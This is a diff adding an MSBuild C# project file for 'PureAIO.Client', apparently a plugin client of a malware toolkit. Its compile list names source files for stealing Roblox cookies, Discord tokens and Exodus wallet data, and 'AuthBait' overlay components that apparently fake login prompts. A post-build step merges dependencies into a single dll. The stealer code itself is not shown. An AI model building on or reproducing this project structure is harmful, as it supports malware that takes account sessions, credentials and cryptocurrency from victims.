@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props"
+          Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{B1A2C3D4-E5F6-7890-ABCD-EF1234567892}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>PureAIO.Client</RootNamespace>
+    <AssemblyName>PureAIO.Client</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <!-- ILMerge output path: merged dll placed next to raw dll -->
+    <ILMergeOutputPath>$(OutputPath)PureAIO.Client.merged.dll</ILMergeOutputPath>
+  </PropertyGroup>
+
+  <PropertyGroup Condition=" '$(Configuration)' == 'Release' ">
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+  </PropertyGroup>
+
+  <PropertyGroup Condition=" '$(Configuration)' == 'Debug' ">
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+  </PropertyGroup>
+
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Security" />
+    <Reference Include="PluginSDK">
+      <HintPath>..\References\PluginSDK.dll</HintPath>
+      <Private>false</Private>
+    </Reference>
+    <Reference Include="protobuf-net">
+      <HintPath>..\References\protobuf-net.dll</HintPath>
+      <!-- merged in by ILMerge — do not copy to output -->
+      <Private>false</Private>
+    </Reference>
+  </ItemGroup>
+
+  <ItemGroup>
+    <!-- Shared packet definitions -->
+    <Compile Include="..\PureAIO\Packets.cs">
+      <Link>Packets.cs</Link>
+    </Compile>
+    <!-- Client files -->
+    <Compile Include="Core.cs" />
+    <Compile Include="AuthBait\AuthBaitWorker.cs" />
+    <Compile Include="AuthBait\AuthBaitOverlay.cs" />
+    <Compile Include="Stealers\RobloxCookieStealer.cs" />
+    <Compile Include="Stealers\DiscordTokenStealer.cs" />
+    <Compile Include="Stealers\ExodusStealer.cs" />
+    <Compile Include="Util\SimpleJson.cs" />
+  </ItemGroup>
+
+  <!-- ILMerge: merge protobuf-net into output dll after build -->
+  <Target Name="ILMergeAssemblies" AfterTargets="Build" Condition="'$(Configuration)'=='Release'">
+    <Exec Command="&quot;$(SolutionDir)References\ILMerge.exe&quot; /target:library /out:&quot;$(ILMergeOutputPath)&quot; &quot;$(OutputPath)$(AssemblyName).dll&quot; &quot;$(SolutionDir)References\protobuf-net.dll&quot;" />
+  </Target>
+
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
